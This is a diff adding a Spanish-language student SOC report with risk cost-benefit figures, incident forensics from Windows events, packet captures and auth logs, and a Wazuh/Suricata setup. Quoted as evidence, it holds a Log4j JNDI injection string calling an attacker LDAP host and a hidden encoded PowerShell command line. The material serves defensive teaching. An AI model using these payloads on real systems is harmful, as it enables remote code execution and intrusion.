@@ -1,0 +1,128 @@
+================================================================================
+INFORME TECNICO DE CIBERSEGURIDAD DEFENSIVA Y OPERACIONES SOC
+ASIGNATURA: Ciberseguridad Defensiva (OCY1105 / CSY6122 / CSY1102)
+EQUIPO EVALUADO: Equipo Alfa - SOC CyberDefenders
+INTEGRANTES: Andrea Valenzuela, Carlos Mendoza, Felipe Morales
+FECHA: 31 de Agosto de 2026
+================================================================================
+
+--------------------------------------------------------------------------------
+MISION 1: GESTION CUANTITATIVA DEL RIESGO DE CIBERSEGURIDAD
+--------------------------------------------------------------------------------
+1.1 Identificacion y Valoracion de Activo Critico:
+    - Activo: Base de Datos Transaccional y Servidor Web Core de Pagos.
+    - Valor del Activo (Asset Value - AV): $500,000 USD.
+    - Amenaza Evaluada: Ataque de Ransomware y Exfiltracion de Informacion Financiera.
+
+1.2 Factor de Exposicion y Perdida Unica Esperada (SLE):
+    - Factor de Exposicion (Exposure Factor - EF): 40% (0.40) estimado ante la ausencia de controles avanzados.
+    - Calculo de SLE:
+      Formula: SLE = AV * EF
+      SLE = $500,000 * 0.40 = $200,000 USD
+
+1.3 Tasa Anual de Ocurrencia y Perdida Anualizada Esperada Inicial (ALE_inicial):
+    - Tasa Anual de Ocurrencia (Annualized Rate of Occurrence - ARO): 0.5 (un evento critico cada dos anos).
+    - Calculo de ALE inicial:
+      Formula: ALE = SLE * ARO
+      ALE_inicial = $200,000 * 0.5 = $100,000 USD / ano
+
+1.4 Propuesta de Salvaguarda y Mitigacion:
+    - Control de Seguridad: Despliegue de Arquitectura Zero Trust con EDR, MFA FIDO2 y WAF.
+    - Factor de Exposicion mitigado (EF_mitigado): 5% (0.05).
+    - ARO mitigado (ARO_mitigado): 0.1 (un incidente cada 10 anos).
+    - Calculo de SLE mitigado:
+      SLE_mitigado = AV * EF_mitigado = $500,000 * 0.05 = $25,000 USD
+    - Calculo de ALE mitigado:
+      ALE_mitigado = SLE_mitigado * ARO_mitigado = $25,000 * 0.1 = $2,500 USD / ano
+    - Costo Anual del Control (Costo_Control): $15,000 USD / ano.
+
+1.5 Analisis Costo-Beneficio (CBA) y Retorno de Inversion en Seguridad (ROSI):
+    - Formula: CBA = (ALE_inicial - ALE_mitigado) - Costo_Control
+    - Sustitucion y calculo:
+      CBA = ($100,000 - $2,500) - $15,000
+      CBA = $97,500 - $15,000 = $82,500 USD / ano
+    - Conclusion Financiera: El control propuesto representa un beneficio economico neto anual de $82,500 USD (CBA positivo), justificando plenamente la inversion.
+
+--------------------------------------------------------------------------------
+MISION 2: DFIR & ANALISIS FORENSE DIGITAL
+--------------------------------------------------------------------------------
+2.1 Identificacion de Artefactos Maliciosos y Hashes Criptograficos:
+    - Muestra de Malware Identificada: updater_payload.exe
+    - Ruta de persistencia: C:\Windows\Temp\updater_payload.exe
+    - Hash Criptografico SHA-256:
+      SHA-256: 4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945
+    - Clasificacion: Trojan.Win32.CobaltStrike.Agent (deteccion 58/72 en VirusTotal).
+
+2.2 Analisis de Event IDs de Windows Security:
+    - Event ID 4624 (Inicio de sesion exitoso / Successful Logon):
+      * Fecha/Hora: 2026-08-30 03:14:22 UTC.
+      * Logon Type: 10 (RemoteInteractive / RDP).
+      * Cuenta de usuario: svc_backup.
+      * Direccion IP de origen: 192.168.1.150.
+    - Event ID 4697 (Instalacion de un nuevo servicio / A service was installed in the system):
+      * Fecha/Hora: 2026-08-30 03:18:05 UTC.
+      * Service Name: WindowsUpdateHelperSvc.
+      * Service File Name: C:\Windows\Temp\updater_payload.exe -k LocalSystemNetworkRestricted.
+      * Tipo: Persistencia / Elevacion de Privilegios (MITRE ATT&CK T1543.003).
+    - Event ID 4688 (Creacion de un nuevo proceso / A new process has been created):
+      * Proceso Creado: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.
+      * Proceso Padre: C:\Windows\System32\services.exe.
+      * Linea de comandos (CommandLine): powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...
+
+2.3 Filtros Wireshark y Analisis tshark en Captura PCAP:
+    - Filtro HTTP POST (Deteccion de Trafico C2 y Exfiltracion):
+      Sintaxis Wireshark/tshark: http.request.method == "POST" && ip.dst == 203.0.113.50
+      Comando tshark: tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e frame.time -e ip.src -e ip.dst -e http.file_data
+      Hallazgo: Exfiltracion de credenciales hacia el C2 en puerto 8080.
+    - Filtro DNS (Consultas Anomalas / DGA / DNS Tunneling):
+      Sintaxis Wireshark/tshark: dns.flags.response == 0 && dns.qry.name matches ".*\\.c2domain\\.xyz"
+      Comando tshark: tshark -r capture.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name
+      Hallazgo: Consultas DNS anomalo hacia c2domain.xyz para canal encubierto.
+    - Filtro ICMP (Tuneles de Exfiltracion y C2 Ping Beacons):
+      Sintaxis Wireshark/tshark: icmp.type == 8 && frame.len > 128
+      Comando tshark: tshark -r capture.pcap -Y 'icmp.type == 8 && data.len > 64' -T fields -e ip.src -e ip.dst -e data.text
+      Hallazgo: Paquetes ICMP Echo Request con payloads de 512 bytes conteniendo datos de configuracion.
+
+2.4 Analisis Forense de Registros Linux en /var/log/auth.log:
+    - Deteccion de Ataque de Fuerza Bruta SSH:
+      Lineas extraidas de auth.log:
+      Aug 30 02:45:11 srv-core sshd[14220]: Failed password for invalid user admin from 198.51.100.25 port 44321 ssh2
+      Aug 30 02:45:14 srv-core sshd[14225]: Failed password for invalid user root from 198.51.100.25 port 44325 ssh2
+      Mas de 1,400 intentos de autenticacion fallidos desde la IP 198.51.100.25.
+    - Acceso Exitoso Anomalo:
+      Aug 30 02:51:02 srv-core sshd[14890]: Accepted password for deployer from 198.51.100.25 port 44890 ssh2
+    - Abuso de Privilegios sudo:
+      Aug 30 02:52:19 srv-core sudo: deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash
+
+--------------------------------------------------------------------------------
+MISION 3: SOC & NIDS (DESPLIEGUE WAZUH SIEM Y SURICATA EVE.JSON)
+--------------------------------------------------------------------------------
+3.1 Despliegue y Configuracion de Wazuh SIEM:
+    - Arquitectura de Monitoreo Centralizado:
+      * Servidor Wazuh Manager 4.8 en cluster 10.0.0.10.
+      * Agentes Wazuh activos instalados en nodos endpoints:
+        - Agente 001: srv-web-prod (10.0.0.25 - Debian 12).
+        - Agente 002: srv-db-core (10.0.0.30 - Ubuntu 22.04).
+        - Agente 003: dc-win2022 (10.0.0.15 - Windows Server 2022).
+    - Monitoreo de Integridad de Archivos (FIM / syscheck):
+      Habilitado para /etc/passwd, /etc/shadow y C:\Windows\System32\drivers\etc\hosts.
+    - Regla personalizada en /var/ossec/etc/rules/local_rules.xml:
+      Regla ID 100201 (Nivel 12): Alerta ante spawn de powershell.exe desde services.exe.
+
+3.2 Integracion y Parseo de Alertas Suricata NIDS en eve.json:
+    - Ubicacion de logs: /var/log/suricata/eve.json
+    - Parseo de alertas (event_type: "alert"):
+      * Timestamp: 2026-08-30T02:40:15.892114+0000
+      * IP Origen: 198.51.100.77:53210
+      * IP Destino: 10.0.0.25:8080 (Servidor Web)
+      * Protocolo: TCP / HTTP
+      * Signature: ET EXPLOIT Possible Apache Log4j RCE Attempt (CVE-2021-44228)
+      * Category: Attempted Administrator Privilege Gain
+      * Severity: 1 (High)
+      * Payload: User-Agent inyectado con jndi:ldap://198.51.100.77:1389/Exploit
+    - Correlacion SIEM y Active Response:
+      Wazuh Manager captura el evento de eve.json, correlaciona con la regla ID 87105 y ejecuta Active Response bloqueando la IP 198.51.100.77 en iptables.
+
+================================================================================
+FIN DEL INFORME TECNICO
+================================================================================
